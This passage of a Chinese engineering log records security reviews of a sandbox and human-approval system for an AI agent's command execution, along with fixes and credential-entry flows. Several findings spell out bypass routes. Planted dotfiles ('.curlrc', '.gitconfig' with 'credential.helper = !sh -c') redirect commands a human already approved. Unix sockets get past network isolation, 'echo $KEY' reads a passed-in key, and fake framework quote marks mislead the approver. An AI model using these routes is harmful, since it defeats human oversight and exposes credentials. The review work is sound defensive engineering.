| L1 | 低 | **像定界符的字只挡了 NFKC 等价的那一族**：⌜⌝⌞⌟（U+231C-F）与 ⸢⸣⸤⸥（U+2E22-5）规范化之后不等于「」，所以四轮那条判据放它们过去；但屏幕上它们就是同一根直角折线 | 名单补四对。这里要挡的从来不是等价关系，是「人一眼读成框架引号」。这类名单天生穷举不完（与 `hasVisibleContent` 那次同一个教训），地板不是这张表而是「框架的定界符只在框架的位置上」 |
| L2 | 低 | **打错的短码被原样回显进一句带框架引号的话里**：`/approve <token>` 的 token 除了「不含空白」没有任何形状约束，转发给人一条 `/approve <乱码><一整段伪造的框架句>`，那段话就出现在阿同的窗口里 | 回显前过同一套清洗 + 24 码点上限（真短码 8 位） |
| L3 | 低 | **`default:` 分支把 `err.message` 倒进聊天窗**：落到这里的是没分类的异常，store 的 ENOENT 带着 `<space>` 绝对路径 | 回执收窄成「没批下去、去哪儿看」；细节 `log.warn` 留在 hub 侧 |
| L4 | 低 | **短码密钥 `existsSync` 之后再 `writeFileSync`**：两个 hub 同时首启会各写各的（后写的赢，先写那把签出去的码当场作废），而 `writeFileSync` 会跟着符号链接写到别处 | 生成走 `'wx'`（O_CREAT\|O_EXCL），EEXIST ⇒ 回头读那一把不覆盖；读到权限松了顺手按回 0600 |
| L5 | 低 | **resume 用的是锁外那次读来的快照**：`resumeParent` 完全按 `item.parentKind` / `item.parent` 走，提交那一刻若盘上已换了父级，这次同意落在 A 上、续跑的是 B 的上游 | 谓词里一并钉住 `parentKind` 与 `parent.taskId`——与八轮钉 `kind` 同一条理由（`validateDecision` 用的也是快照） |
| L6 | 低 | **web-only 闸读的也是快照**：指纹盖住 itemId/createdAt/title/prompt，重新 park 一定换 `createdAt` 所以那条路已被盖住；但「谁把这一项标成可在 IM 批」这个判断本身，应该在它被执行的那一刻仍然成立 | `resolveByShortId` 的谓词里加 `fresh.imApprovable === true` |

**核实后没照办的两条**（Codex 提了，对源码核过，方向不对）：①把 `<` `>` 也降级成安全字符——审批行里的
`>` 正是 shell 重定向，改写它等于把人必须逐字读懂的那条命令**改错**，拿正确性换一个富文本渲染的小问题；
②Matrix 的 `chatKind` fail-closed——Matrix 事件结构上说不出房间是不是 DM（`m.direct` 是客户端账号数据），
一律当群会连 DM 推送一起打断，这是 GRP 当时就记过档的残余，不是这刀带出来的新病。

九轮逐条变异测试（十二道门，全部按预期只红该红的那一例，复原 byte-identical）：名单里塞 `hands_run`
⇒ 双向核对红；把 claim 短路 ⇒ 并行批那例报「期望 1 次实际 2 次」；判据退回文本考古 ⇒ 伪造那例红；
host 不传转派谓词 ⇒ 转派那例红；回执改回沉默 ⇒ 「没跑成要说」那例红；删掉备份排除行 ⇒ 短码钥那例红；
名单退回三对括号 ⇒ 角括号那例红；短码原样回显 / `default` 回显 `err.message` ⇒ 各自打红同一条 e2e 的
不同断言；密钥权限不修回 ⇒ 密钥那例红；父级不钉 ⇒ 父级那例红；`imApprovable` 不钉 ⇒ 指纹那例红。

**这一轮自己踩的坑**（第四次同一教训）：并行批那道门第一版**假绿**——短路 claim 也不红。用一次性探针把
顺序打进文件才看清：`setImmediate` 转 20 圈过去的真实时间**约等于 0**，两条 resolve 根本还没跑到
`resumeParent`，断言量的是一个从未打开过的窗口。改成等**条件**（父 resume 到了、两个子任务都有结果）
才真钉住。**轮询圈数不是时间。**

### 10.7 第十轮（内部对抗审，**2H 已修 / 1M 待决 / 1M 记档**）

九轮全部收口后又做了一轮独立对抗阅读（不是 Codex——Codex 额度 2026-08-19 恢复，
那一轮照办）。出 2H/2M，四条都已对源码核实属实。两条 HIGH 各自牵到设计面
（谁有资格拿到手 / HOME 是什么），按「架构岔口摆给用户」的纪律先摆再改，
**用户已拍板：H1 = 默认只 owner/admin，H2 = HOME 改成只读空目录**，两条都已落地。

**当前零暴露**：`hands.json` 在生产不存在，M2 的这批 commit 也还没推没部署。
下面几条描述的是「一旦打开会怎样」，不是「现在正在发生」。

| # | 严重度 | 缺陷 | 证据 | 状态 |
|---|---|---|---|---|
| H1 | 高 | **`hands.json` 是 hub 级布尔，而它打开的是每一个成员的执行权**。没有角色维度也没有名单：`enabled:true` 之后凡是有管家的成员（家庭里的孩子、门店店员）都拿到监狱内的命令执行，且 tier 2 联网动作的审批人就是发起人本人。对照同一刀里的 `pack_backup`——一个只读打包在 classify 与 execute 两端都有 owner/admin 闸，而任意命令执行没有 | `personal-butler-hands.ts:122-181`（配置键里没有角色/名单）、`personal-butler-factory.ts:462-464`（判据只有 `governedOn && hands?.host`）、`personal-butler-escalation.ts:52-56`（审批人=本人）、对照 `personal-butler-backup.ts:98-99,274` | **已修**（用户拍板「默认只 owner/admin」）——见下 |
| H2 | 高 | **HOME 指向模型可写的工作区**，于是 tier 1（免审批）写的点文件，静默改写每一条**已经批准**的 tier 2 联网命令。`hands_write {path:'.curlrc'}` 不 park 不出卡；下一轮 `curl -sS https://api.github.com/user` 出卡、人读了那个正经域名、批——执行时 curl 读 `$HOME/.curlrc` 走攻击者的代理。同型还有 `.gitconfig` 的 `url.<x>.insteadOf` 与 `credential.helper = !sh -c`、`.npmrc` 的 `registry=`。台账记的也是那条干净 argv | `personal-butler-hands.ts:1411`（`HOME: workspace`；childEnv `:1409-1431` 无任何 `GIT_CONFIG_*`/`NPM_CONFIG_*` 中和项）、`hands-policy.ts:407-412`（工作区内写=tier 1 allow）、`:120-134`（`sh` 不在拒绝表）、对照合同 `approval-text.ts:27` | **已修**（用户拍板「HOME 改成只读空目录」）——见下 |
| M3 | 中 | **`--unshare-net` 不管 AF_UNIX**。bwrap 基座是 `--ro-bind / /`，网络命名空间隔离挡不住文件路径上的 unix 套接字；而藏名单只点了 docker/podman 两家五条，`/run` 与 `/var/run` 本身不在藏名单里。**内部一致性论证**（比外部知识硬）：如果只读挂载能挡住套接字连接，那么首轮 H1 特意去藏 `docker.sock` 就是死代码——这个库自己的立场就是「套接字是一条出路」，只是用在了两个产品名上没推广到这一**类**。于是同机以套接字暴露的本地服务（postgres/redis/php-fpm/自建转发代理），能在 tier 1「离线」档里被读写，一次 park 都不会发生 | `workspace-jail.ts:490,496`、`personal-butler-hands.ts:216,218-224` | **待决**；只影响 Linux（macOS 侧 `(deny network*)` 按 SBPL 语义覆盖 unix 套接字），本机无法实证，与「真 bwrap spawn 门待 Linux 真机」同一批 |
| M4 | 中 | `redact()` 只挂在错误路径（`:924` `isError ? ... : out`），而 tier 1 的一条 `pwd` 就把它想藏的四件（哪台机器、哪个用户、装在哪、工具链在哪）原样打出来；`USER`/`LOGNAME` 还是主动递进去的 | `personal-butler-hands.ts:580-586,924,1420-1423` | **不修，改记诚实残余**——见下 |

**H1 的修法（用户拍板「默认只 owner/admin」）**：`hands.json` 加 `allowRoles`，
**默认 `['owner','admin']`**——给成员一双手要在文件里把 `member` 写进去，是一次显式的
决定而不是一次遗漏。判据只有一个 `hands.allowed(userId)`，它挂在 `ButlerHandsHost` 上
（在 `armButlerHands` 里、身份还在手边的地方构造），于是 `buildButlerHandsToolset` 想
不带闸都调不出来——**闸放在忘不掉的地方**。它出现在**三处**，各有各的理由：①工具面
（不该给一个永远会被拒的人广告五件工具，那是白付 token）；②`classify`——排在
`ensureWorkspace()` **之前**，不够格的成员连工作区目录都不该被建出来；③`execute`——
不复述 classify 的答案而是**再问一遍**，因为 park 可以挂几个小时，而批准是对**那一刻
够格的他**发的，降权之后那张批准不该还能兑现。配置层同样 fail-closed：`allowRoles`
必须是非空的、闭集内的、不重复的角色名——`"members"` 这种拼错**是一次静默收紧**
（手看起来装上了，每个人都被拒），所以认不出的角色名一律 warn + 不装，而不是 clamp
后装上。查不到成员角色（identity 缺席）时**整套手不装**，与「监狱缺席不装」和
`pack_backup` 在 identity 缺席时不出现是同一姿态。最后一处是**说给人听的那行字**：
`my_status` 的「手」一行本就是这个成员在读，装着但没开给他的时候印「已装，工作区里
写/读/跑」就是在许一个他这边兑现不了的承诺——改成三种「没有」各说各的话（不装 /
总开关关着 / 装了但没开给你，附上开给谁）。

**H2 的修法（用户拍板「HOME 改成只读空目录」）**：把 HOME 从工作区挪到
`<space>/butler/hands/<user>/home`，并在监狱里**只读**再放开一次。这条线的名字是
**缓存不改行为、配置才改行为**：`XDG_CACHE_HOME`/`NPM_CONFIG_CACHE`/`PIP_CACHE_DIR`
显式指进工作区（可写、可回收、重复下载很贵），而查配置的每一条路都指向那个空目录 ⇒
查不到 ⇒ 工具走自己的默认值。`XDG_CONFIG_HOME` **刻意不设**——设了就等于又给了一个
可写的配置落点。为什么是「只读空目录」而不是「藏掉」：bwrap 那边的藏法是盖一层空
tmpfs（`mkdir -p $HOME` 就能把点文件重新种回来），seatbelt 那边是硬 deny；**一个已经
存在的空目录经 `readOnlyRoots` 再放开，在两个执行器上行为一致**，而且 HOME 仍然
`stat` 得到——很多工具 stat 不到 HOME 会以看不懂的方式崩，H2 要的是**空**不是**没有**。
`childEnv` 的 `home` 因此是**必填**：少传就退回「HOME=工作区」，正是要堵的那个洞，
让类型系统在编译期问这个问题，别让它变成「谁记不记得住」。

**两条各配会红的门，八道变异逐条验过**（每道先确认它只改了想改的那一处，复原一律走
精确文本替换 + `shasum` 对拍基线，**不用 `git checkout`**——那会把同文件里未提交的活
一起丢掉，八轮已经栽过一次）：工具面去掉 `allowed` ⇒ tiers 两例红（脸 + `my_status`
那句话，两者共用同一个判据）；classify 去掉闸 ⇒「五件全 refuse 且不建目录」红；
execute 去掉闸 ⇒「park 期间被降权」红；闭集校验退成「只要是字符串」⇒ 拼错/大小写两例红；
`armButlerHands` 在没有 identity 时照装 ⇒ fail-closed 那例红；HOME 不再作只读层放开 ⇒
HOME 探针红；HOME 退回工作区 ⇒ 纯件 + 真 spawn 两例红；去掉缓存变量 ⇒ 同两例红。
**其中 HOME 那道第一遍没红**：原断言只问「列出来是 0 条」，而 `ls` 失败同样输出 0 行 ⇒
「HOME 根本不存在」被一起放过。补上 `test -d` 与「列得动」两问才真钉住 —— **变异不红时
先怀疑门**，这条教训在这个 track 里出现第四次了。

**M4 为什么不修**：把成功 stdout 也过一遍 redact 治不了它。tier 1 就是任意离线命令执行，
`echo $HOME | base64` 一句就绕过任何字符串替换；能挡住的只有「模型没主动要、却被塞回去的」
错误文本。所以 `redact()` 的**真实身份是错误路径的卫生措施，不是对着一个能跑命令的模型的
保密边界**——原注释把它写成后者是过度声称。这条按「说清楚」收口，不按「补一道挡不住的墙」收口。

**已核实不成立的（本轮排除）**：工作区里的符号链接经全量备份外带宿主文件（`backup.ts:100-106`
只收 `isFile()`）；`hands_*` 混进 AFR 两层目录绕过一等审批（五件全在 governed 数组，
`butler-tool-tiers.test.ts:209-214` 正向断言）；`nodePrefix` 只读回放把 HOME 的遮盖捅穿
（同深度时 `JAIL_LAYER_RANK` 让 hidden 后发，失败方向是「手不能用」不是「HOME 露出来」）；
`BUSY` 的 TOCTOU（检查与占位之间没有 `await`）；park 与 resume 之间参数被掉包（重放的是
`pending.toolUses` 快照）；argv 塞换行做审计日志注入（`JSON.stringify` 转义）；监狱内 node
小助手最后一行 JSON 被伪造（唯一一次 `out()` 之后不再执行任何代码）；配额丈量被链接骗过
（`measureTree` 显式跳过 symlink）；hands 目录被记忆维护 sweep 扫到（两棵树）。

**本轮没看到的面**（预算所限，Codex 那轮或下一轮补）：`/metrics`、`gotong doctor`、
`setting` 运维台、`restore`/`migrate` 是否会碰到 hands 工作区或短码钥；
`personal-butler-backup.ts` 的成员枚举；seatbelt 侧 `hiddenFiles` 的 SBPL 生成分支。

### 10.8 第十一轮（对第十轮那刀本身再审，**1M 已修**）

按这个 track 的规矩：每一轮都审**上一轮修完的**代码——这条规矩在九轮里救过两次
（有两条 HIGH 正是前一轮的修法自己带出来的）。第十一轮只盯第十轮那一刀，抓到一条。

| # | 严重度 | 缺陷 | 状态 |
|---|---|---|---|
| M1 | 中 | H2 新造的缓存目录 `<工作区>/.hands-cache` **进全量备份档**。备份那道排除面（`isHandsScratchPath`）当初写下来就是为了挡「一个脚手架塞进几万个文件、把档案吹到百兆」，而 npm/pip 缓存正是那件事的教科书形状；`.hands-tmp` 从 M2 第一版起也一直在档里。换句话说：**修 H2 的那一刀，把一个既有的门要防的东西又造了一份出来，却没把门加宽** | **已修** |

**修法**：排除面加上框架**自己拿名字占住**的那两个目录。两种匹配的宽严**刻意不同**——
`node_modules` 是生态惯例名、谁都可能在任意深度造出来，所以按路径名一段一段找；而
`.hands-tmp`/`.hands-cache` 是框架在**固定位置**放的（TMPDIR 与包管理器缓存根），
所以只认工作区**正下方**那一层，成员在别处建个同名目录是他自己的东西，照收。
子集档（identity/relations）本来就是白名单式过滤，结构上不受影响。

**跨包那道缝**：排除面住在 `packages/cli`，常量住在 `packages/host`，而 `cli↛host`
是硬约束——cli 只能把名字**逐字重写一遍**。手抄就会漂移，所以配一道**对拍门**放在
host 侧（host 本就依赖 cli）：它同时拿 host 的常量与 cli 真正在用的那个函数来对，
量的是**那一份实现**不是一份副本。两道变异各验一次：改 host 的常量 ⇒ 对拍门红而
`childEnv` 那些断言**全绿**（它们两边都用同一个常量，自洽，天生看不见改名）——这
恰好说明为什么需要这道门；把 `.hands-cache` 从 cli 名单里去掉 ⇒ cli 与 host 两侧
各红一例，证明门确实接到了真实现上。

---

## 十一、M2b 落地记录（2026-08-16）

### 11.1 形状：手 B 不是第二座监狱，是同一座监狱换个住客

`packages/host/src/personal-butler-coder.ts` 只做一件事——**装配**。围墙、藏起来的东西、
只读的空 HOME、过滤过的 PATH、工作区的位置、谁有手，全部从手 A 的 `ButlerHandsHost` 上取，
一处也不重新推导。第二份推导迟早会和第一份不一样，而不一样的那天不会有人收到通知；真到
那天，手 B 就是通往同一栋房子的一扇更弱的门。

**配置读者只有一个**：`coder` 块的形状门写在 `personal-butler-hands.ts` 里，紧挨着
`roleListProblem`/`pathListProblem`——`hands.json` 只有一个解析器。顺带也让
hands↔coder 结构上不可能成环。块的形状不对 ⇒ **整份 `hands.json` 不装**（warn + OFF），
与其它每个键一致：让手 A 照跑而手 B 悄悄没装，是同一个文件里的两套规矩。

五道 fail-closed 闸，顺序是刻意的：①手 A 没装 ⇒ 不装；②没有 `coder` 块 ⇒ 不装
（opt-in，缺席=字节不变）；③`coder.userId` 不在 `allowRoles` 里 ⇒ 不装，**且在建任何
目录之前**（手 B 的权限是手 A 权限的子集，不另开一道门）；④`agentId` 撞上一行不是我们
建的 agent ⇒ 不装（绝不覆盖操作者的东西）；⑤工作区建不起来 ⇒ 不装。

几处承重判断：

- **围墙每次 spawn 现算**（`PerSpawn` thunk）。参与者活得比任何一次 spawn 长，一份在构造时
  冻住的围墙会**悄悄变弱**（boot 之后才装上的套接字不再被藏），而 `jailed: true` 读起来
  一模一样。thunk 抛错 = 这一轮失败，不 spawn。
- **环境是「说出来的」不是「减出来的」**：`envMode: 'replace'`，`{...passed, ...jailEnv}`
  ——展开顺序承重，`passEnv` 只能补充，永远盖不掉 HOME / PATH / TMPDIR / 代理过滤。撞名的
  那些**说出来**（静默丢弃会让操作者以为透传生效了），判据是把两个真对象的键比一比，不是
  一张迟早过期的保留字表。
- **`passEnv` 存的是名字不是值**（与 MCP `${NAME}`、MR-M6 `apiKeyEnv` 同一条凭证纪律），
  名字形状门顺带接住「把 `sk-…` 粘进来了」。
- **能力叫 `hands.coder`，刻意不通用**：广告一个能力就是授权它（G-M1），叫 `code` 那种通名，
  别处一次无心的派发就会撞进一个能改文件的 CLI。
- **名册行 + owner 授权两样都落**：`escalate_to_expert` 的 fail-closed 检查走
  `roster.listOwned(userId)`，那是 identity 授权表 ∩ `space.agents()` 的交集——少任何一样
  转派都过不去。行是**故意露出来的**：一个能改文件的参与者不该藏在名册外面。
- **观察缝免费**：`onChunk` 播成 `llm_stream_chunk` 瞬时事件，admin 面板已经在消费它，
  于是人能看着它干活，而不是等十五分钟看一个结论。

### 11.2 这刀顺手挖出手 A 的一个真洞（macOS 独有）

验收门第一次跑，手 B 把 `impl.js`/`test.js` 写进共享工作区都对了，最后阿同
`hands_run [node, test.js]` 却挂在：

```
Error: EPERM: operation not permitted, lstat '<space>'
    at Object.realpathSync (node:fs)
    at toRealPath (node:internal/modules/helpers)
    at resolveMainPath (node:internal/modules/run_main)
```

**病根不在手 B**：工作区住在**藏起来的** `<space>` 底下，`(deny file-read* … (subpath
<space>))` 盖的是 `<space>` 自己，而重新放开的只是更深处的工作区。打开里面的文件没事
——内核自己走路径，seatbelt 判的是**操作目标**不是祖先——但凡从**用户态**逐级解析路径的
都会死在第一个藏起来的那级。那正是 `realpath(3)` 干的事，也正是 Node 对主模块干的事。
M2 的真 spawn 用例清一色 `node -e '<inline>'`（不解析磁盘模块）、`ls`、`sh -c`，所以这个
洞一直没露面——**而「跑一下工作区里的文件」正是工作区存在的理由**（`node test.js`、
`pytest`、`npm test` 全在这条路上）。

**修法**（core `buildSeatbeltProfile`，新 `seatbeltTraversableAncestors`）：为每个被重新
放开的根，把它**在藏起来的子树里的那些祖先**逐个补一条 `(allow file-read-metadata
(literal a))`。判断的依据是一句结构性事实——**被我们主动放开的路径，它的祖先不可能是秘密**：
子进程自己的 cwd、`HOME`、`TMPDIR` 全都在 `<space>` 底下，名字早就告诉它了。藏着它们
一分钱买不到，却把路径解析整个弄坏。

**给的恰好是 `stat`，不是别的**：读目录的**条目**是 `file-read-data`，仍然拒。真机探针
逐条证实：`node test.js` 与相对 `require` 通了，`ls <space>` → EPERM，`cat <space>/…` →
EPERM。bwrap 不需要这条——`--tmpfs` 盖住再 `--bind` 里面那层，中间目录是 bwrap 自己造出来
的真（空）tmpfs 目录，天生 stat 得到。

一道变异验过：把那段发射改成永远为空 ⇒ core 2 例 + host 2 例（手 A 的 `node x.js` 与 M2b
验收门）各自变红，别的一个没动；复原后 `shasum` 与基线逐字节一致。

### 11.3 门

| 层 | 例数 | 钉住什么 |
|---|---|---|
| ① 配置 | 12 | 默认值填满；8 种坏形状各自的拒因（未知键/缺 userId/缺 command/agentId/promptVia/timeout/maxTurns/不是对象）；`passEnv` 里粘了值而不是名字；label 里的控制字符；**坏 `coder` 块把整份 `hands.json` 拖下水**，好块则一路带上 |
| ② 装配闸 | 7 | 手 A 没装/没有块（**零副作用，盘上无痕**）/成员不够格（不建目录、不发授权）/撞上别人的行（那行一个字节不动）/重装我们自己的行/装上（参与者 + 无 `managed` 的名册行 + owner 授权）/能力就是 `hands.coder` |
| ③ 围墙 | 3 | 输出实时进 transcript；**`passEnv` 只能补不能盖**（HOME 仍是那个只读空目录 + 撞名 warn）；围墙**每次 spawn 现算**（arm 之后新藏一个目录，下一次 spawn 就该盖住） |
| ④ 验收门（真监狱） | 2 | **阿同写需求 → 手 B 改文件（真落在手 A 的工作区里）→ 阿同 `hands_run` 跑测试出 `TESTS PASS`**；手 B 关在同一座监狱里——读不到 hub 用户 HOME 里的钥匙 |

验收：host **2976**+5skip（coder 25 + 手 A 那条新回归 1），core **495**（+6），cli-agent 42，
四门 PASS（**旋钮 116 零新增**——`coder` 块是 file-first 配置不是旋钮；main.ts 2781，
棘轮显式抬 2780→2790 留余量）。

### 11.4 诚实残余

- **手 B 结构性联网**（它得连自己的模型）。监狱护的是 hub 自己的凭证与配置，**不是**
  「工作区里的内容不会被发出去」——把一份代码交给一个云端模型改，就是把它发出去。要的是
  别的东西，就别给它这份工作区。
- **祖先的 `stat` 是真给出去了**：`<space>` 与那几级中间目录的大小/时间戳，监狱里量得到。
  内容与目录条目仍然拒（§11.2 探针）。
- 手 B 的**转派回执**沿用 DUO 的 fire-and-forget 语义：回执即时、结果 pushToMember 推回。
- **`passEnv` 不可避免是一条凭证通道**（Codex 轮 B HIGH，核实属实，**如实记档而不是"修"**）：
  一个外驱的 coding agent 不拿到自己的模型 key 就开不了工，所以 `hands.json` 里那份透传表
  天生就要递 key 进监狱；递进去之后，监狱里的进程读得到它——`hands_run` 一句 `echo $KEY`
  就够。要把它变成「阿同看不见的 key」，得在监狱外面立一个本地代理端点、由它替手 B 转发
  模型请求，那是**一个新子系统**，不是一处补丁。所以这一刀做的是「别让它悄悄发生」：装的
  时候把凭证形状的名字（判据复用 `isSecretKey`，与 `/setkey` 拒绝那条同一份定义）**点名印
  在日志里，值永远不印**，操作者于是确切知道自己刚把哪几样递了进去。**别把不该给这只手的
  key 写进 `passEnv`** —— 给它的那把，就当成它已经知道了。
- 真 bwrap 的这条路仍待 Linux 真机（本机只有 seatbelt）；core 侧由 profile/argv 单测钉住。

---

## 十二、M3a 落地记录（2026-08-17）

要治的是一件很小、很具体的事：**key 在周日过期，而换掉它的唯一办法是一台笔记本上的
管理员会话**。手机上该有的别的都有了（运维台、审批、工作流），只剩这一趟必须回到桌前。

三层一刀，每层只做自己那件事：`@gotong/im-adapter` 认领动词的**每一种形状**，
`host/src/im-credentials-service.ts` 拿着秘密去写金库并**返回一个不含秘密的结果**，
`im-bridge.ts` 只按结果渲染文字。凭证值因此只到达 `setAgentApiKey`/金库，别处一个字节没有。

### 12.1 一个刻意不对称的解析

命令面的所有别的动词，解析不出来就落回 `{kind:'free'}` 交给模型——那条路会 **记录并重放
原文**（SESS 会话窗、transcript、episodic 捕获）。`/setkey` 是唯一一个载荷本身就是秘密的
动词，于是它的解析是不对称的：**认得出就带值走，认不出就带 `mode:'help'` 走，永远不落回
自由文本**。别名 `setkey|set-key|set_key|key` 一并认领，把「手忙脚乱时打错的那几种」也圈
进来——漏认一种，那一条就变成一条把 key 念给模型听的普通消息。

### 12.2 结果里不带成员打的字（写门时挖出来的真缺陷）

原本 `unknown_target` 的回复会把你打的那个词回显出来（「不认识目标「xxx」」），读起来很
体贴。写测试时发现：**`/setkey <key> <agent>`——正是着急的人会打的那个顺序——是一条合法
的两段解析，它的 `target` 就是 key 本身**。于是那句体贴的话会把一把活钥匙印进聊天记录里，
而且恰好发生在这个面存在的理由（人手忙脚乱）上。

修法不是「回显前洗一遍」，是**把成员打的字从渲染层整个拿走**：`renderSetKeyOutcome` 不再
收原始 target，每一个结果携带的字符串都取自 hub 自己的记录（agent id、provider 标签、环境
变量名）——`ambiguous_target` 那条也从 `args.target` 改成 `agentHit.id`（今天是同一个字符串，
但取自记录才让「结果里没有成员的字」变成形状的性质，而不是这一行一直写对的性质）。渲染层
因此没有任何需要判断「这段文字重复出去安不安全」的地方，也就没有一个将来会写错的清洗调用。
顺序打反的那句话改成只讲规则：「第一个词不是这台 hub 认识的目标（注意顺序是先目标后 key）」，
再列出**可用的目标**——信息量没少，key 一个字符没出现。

### 12.3 存下去必须真管用

三条拒绝，都是「宁可说不，也不要假装成功」：

- **`env_pinned`**：agent 配了 `apiKeyEnv`（MR-M6 语义是**排他**的），存进金库那把永远轮
  不上。回「你这台 agent 认的是环境变量 `X`」并指路，不写。
- **`mock_agent`**：mock 不看 key。
- **`openai-compatible` 当共享档**：那个标签是 DeepSeek/Qwen/MiMo 的伞，一行共享 key 会把
  DeepSeek 的钥匙递给 MiMo 的端点，401 还会撒谎说成是钥匙不对（`me-credentials-service`
  当年按同一条理由收窄过成员自带 key）。**按 agent 的那种写法不含糊，照开**。

**重启是承重件**：托管 agent 在 spawn 那一刻解析一次 key（`resolveApiKey` → `providerFactory`），
存完不重启，「已存入」就会被读成「修好了」而其实什么都没变。所以写完即重启受影响的 agent；
共享档只重启**真会换钥的**那些——被 per-agent key 或 env 盖住的照旧不动（打断一个正在好好
干活的 agent 去改一个不影响它的东西，是另一种不诚实）。`/keys` 把这件事摊开：哪个槽位有、
最后一次更新在什么时候、以及**解析优先级**那一行。

### 12.4 门

| 层 | 例数 | 钉住什么 |
|---|---|---|
| ① 解析（im-adapter） | 12 | 三个别名 + 大小写 + 多余空白都认领；坏形状一律 `mode:'help'` **且不带值**；`link` 子命令；`/keys` |
| ② 服务 | 30 | 秘密只到金库（日志/审计/回结果全文扫描连**前 12 个字符**都不许出现，且**每一条拒绝路径都用带哨兵的秘密驱动**——包括最容易长出「你打的是…」的坏形状那条）；三条拒绝各自；写完重启谁不重启谁；`env_pinned`/`per-agent` 遮蔽判定；`list()` 只在 anthropic/openai 上报 workspace/env（那才是 `resolveApiKey` 真去问的层）；**优先级表由真 `selectLlmApiKey` 推导出来对拍**（逐层静默、看它退到哪一层），不是抄一份常量 |
| ③ 路由（e2e） | 8 | 直贴后 transcript/会话窗/派发全空；**顺序打反不回显 key**；坏形状不落自由文本（6 种形状）；不够格的成员与没接线的 host **逐字节同一句**；surface 抛错既不漏 key 也不漏 `<space>` 路径；`/keys` 与每一条拒因都渲染得出；`/help` 两个动词都在 |

四道变异四次全红（priority 表改掉 / 拒绝路径的泄漏断言 / 重启把被遮蔽的也重启 / 把原始
target 塞回渲染层），复原 `shasum` 逐字节一致。**其中一道第一遍没红**——拒绝表给坏形状那行
喂的是一个随手写的短字符串，哨兵根本不在场，于是「日志里回显了秘密」这个变异无迹可寻；
改成每一行都用带哨兵的秘密驱动才真钉住。**变异不红时先怀疑门**（本 track 第五次）。

验收：host **3014**+5skip（+38），im-adapter **45**（+12），四门 PASS（**旋钮 116 零新增**——
这个面接不接就是开关；main.ts 2785/2790）。

### 12.5 诚实残余

- **直贴这条路上，IM 平台的服务器看得见那把 key，聊天记录里也留着底**。这是用户拍板保留的
  路径（岔口 2），不是没想到；回复固定提醒「请手动删除刚才那条消息」。把平台挡在外面的那条
  路是 M3b 的一次性链接，两条路的优劣文案跟它同刀。
- 撤回原消息的 best-effort（平台支持时）**尚未接**——M3b 做的是「让 key 根本不进聊天窗」的
  那条路（一次性链接），没有顺手把这条捡起来；仍是残余，见 §13.10。
- `/keys` 报的是**有没有、什么时候更新的**，不报「能不能用」——那是「测试连接」按钮的事
  （MR-M5），要花钱要打真端点，不该由一条只读命令顺手做掉。
- config-write（`/model set`、`/setting config-set`）仍按 `SETTING-OPS-CONSOLE` 的老规矩在
  IM 上 ✗；两步确认与那张表的改口归 M3c。

---

## 十三、M3b 落地记录（2026-08-17）

M3a 把「换 key」搬上了手机，代价写在它自己的残余里：那条路上 key 会经过 IM 平台的服务器，
并在聊天记录里留底。用户在岔口 2 明确要保留它（着急的时候它最快），同时要「告知两种方式
优劣」——**M3b 就是被告知的那第二条**：聊天窗里只走一个十分钟的一次性令牌，秘密从手机浏览器
直接进金库，IM 平台被整个挪开。

### 13.1 令牌从不被写下来

`setkey-link-store.ts` 的不变量，逐条都有门：

- **文件名是 `sha256(token)`**。读到那个目录的人知道「有一条链接、是给谁的」，重建不出可用
  的 URL。门是逐字节扫盘上的每一个字符。
- **`'wx'` 建、0600**，与所有挨着凭证的文件同一姿态。
- **十分钟 TTL，两处读都判**，过期的那份顺手扫掉。
- **发新的杀掉本人的旧链接**（与 IM 绑定码、设备配对码两族「出新码即废旧码」同一条规矩），
  别人的一条不动——走开没用的那条链接不该一直活着。

### 13.2 单次是靠删除实现的，不是靠一个布尔

`consume` 先 `unlinkSync` 再报成功：**移除本身就是认领**。先读出来、再标一个 `used`，中间就有
一个窗口能让两个并发提交都被放行；这里没有那个窗口，因为放行的凭据就是「我删掉了它」。

### 13.3 拒绝的顺序也是设计

`submitLink` 里，**纯形状检查排在花掉链接之前**——唯一现实的失误（粘贴粘断了）不该逼人回聊天
窗再要一条新链接。它读 hub 的零个状态、泄露零个事实，所以不为它烧链接对一个握着令牌的攻击者
一点好处也没有：他本来就能花掉一次，而这行之后的**每一条**分支都花。别的一律先 consume。

### 13.4 链接不是一张被捕获的许可

`linkPage` 与 `submitLink` **各自重新问一次 `allowed()`**，不信任发码那一刻的判断——和手 A 在
execute 再问一次同一条理由：链接会在屏幕上躺几分钟，而写入是替**此刻**的这个人做的。

而且 `submitLink` **不收 userId**：身份是从令牌里读出来的，提交者说不出它是谁。门钉的是
`allowedAsked === ['u-alice']` ——被拿去问权限的，只可能是令牌的主人。

### 13.5 选择器只是不提供做不到的，它不授权别的

- picker 的 `value` 用显式 `agent:` / `provider:` 形式 ⇒ 表单来的提交**结构性**撞不上
  `ambiguous_target`（裸名解析留给聊天那条路，那里打前缀是摩擦；这一页有地方把话说清楚，免费）。
- `openai-compatible` 那把伞根本不出现在共享行里 ⇒ `vendor_ambiguous` 从表单**够不到**，
  而不只是被拒。
- 已经能提前看见的「不行」（mock / env-pinned）在页面上 `disabled`——一条一次性链接不该花在
  hub 早就看得见的拒绝上。**但服务端照拒**：手工构造的提交仍走同一条判定。选择器是不提供
  做不到的，不是替剩下的那些发许可。

### 13.6 表单那一页

- **挂在 CSRF 门之前**（与 OIDC / OAuth callback 同区）。理由不是「方便」：这条路上根本不存在
  任何环境凭证——没有 cookie、没有 bearer、成员从没登录——所以没有东西可供一次 CSRF 去花；
  **令牌就是授权**。这句话写在挂载处，因为一条路为什么坐在门前面，必须在门那儿读得到。
- **零 JavaScript**。hub 的 CSP 是 `script-src 'self'` 且没有 `unsafe-inline`，一个内联
  `<script>` 会被静默吞掉（SHELL-M4 那个下午）。一张纯 HTML form 不需要脚本，于是这个坑
  结构性不存在。
- **秘密不出现在任何响应体里**，包括那一次会重画表单的失败：`renderForm` 结构性收不到它。
- `no-store` + `no-referrer`——referrer 会把带令牌的那条 URL 递给下一跳。
- host 侧的 code 与 web 侧的 DTO 是**镜像的联合类型 + 穷尽 `switch` + `const never: never`**：
  host 加了一个 web 没接的 code 是**编译错误**，不是一张白页。`web ∌ host` 是硬约束，这是能把
  「两边不漂」交给类型系统的唯一办法。
- per-IP 预算在碰到 surface **之前**就拒（429）；405 带正确的 `allow`；超大 body 413 且不到
  surface。

### 13.7 审计里 `actorSource` 还是 `im`（想清楚了才没改的那个决定）

`actorSource` 是个小闭集，它答的是**「这个人是怎么被确立的」，不是「字节经过了哪个键盘」**：
这条路上没有会话也没有 bearer，成员从没登录，而我们**确切知道他是谁**——因为那把一次性令牌
